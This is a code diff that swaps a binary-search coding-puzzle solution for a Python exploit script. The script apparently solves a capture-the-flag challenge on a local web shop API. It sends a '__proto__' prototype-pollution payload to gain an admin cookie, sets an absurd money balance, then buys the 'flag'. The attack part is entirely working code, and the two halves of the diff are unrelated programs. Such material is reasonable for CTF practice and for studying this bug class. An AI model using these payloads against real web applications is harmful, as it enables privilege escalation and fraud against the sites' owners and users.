@@ -1,42 +1,39 @@
-from typing import List
+import requests
+
+base_url = "http://localhost:3000/api/v1"
 
 
-class Solution:
-    def successfulPairs(self, spells: List[int], potions: List[int], success: int) -> List[int]:
-        # 1. init
-        res = []
-        m = len(potions)
+def become_admin():
+    param1 = {
+        "__proto__": {
+            "admin": True
+        }
+    }
+    res = requests.post(f"{base_url}/sell", json=param1, headers={"Content-Type": "application/json"})
 
-        # 2. sort
-        potions.sort()
+    return res.headers['set-cookie'].split("; ")[0]
 
-        # 3. lower bound
-        def lower_bound(spell):
-            s, e = 0, m
 
-            while s < e:
-                mid = s + (e - s) // 2
-                if spell * potions[mid] < success:
-                    s = mid + 1
-                else:
-                    e = mid
+def get_money(cookie):
+    param2 = {
+        "money": 2.5e25
+    }
+    res = requests.post(f"{base_url}/money", json=param2, headers={"Cookie": cookie, "Content-Type": "application/json"})
 
-            return e
 
-        # 4. loop
-        for spell in spells:
-            index = lower_bound(spell)
-            success_cnt = m - index
-            res.append(success_cnt)
+def buy_flag(cookie):
+    param3 = {
+        "fruit": "grass",
+        "quantity": 1
+    }
+    res = requests.post(f"{base_url}/buy", json=param3, headers={"Cookie": cookie, "Content-Type": "application/json"})
+    return res.text
 
-        return res
 
-sl = Solution()
+def main():
+    cookie = become_admin()
+    get_money(cookie)
+    flag = buy_flag(cookie)
+    print(flag)
 
-spells = [5,1,3]
-potions = [1,2,3,4,5]
-success = 7
-
-res = sl.successfulPairs(spells, potions, success)
-
-print('res', res)
+main()
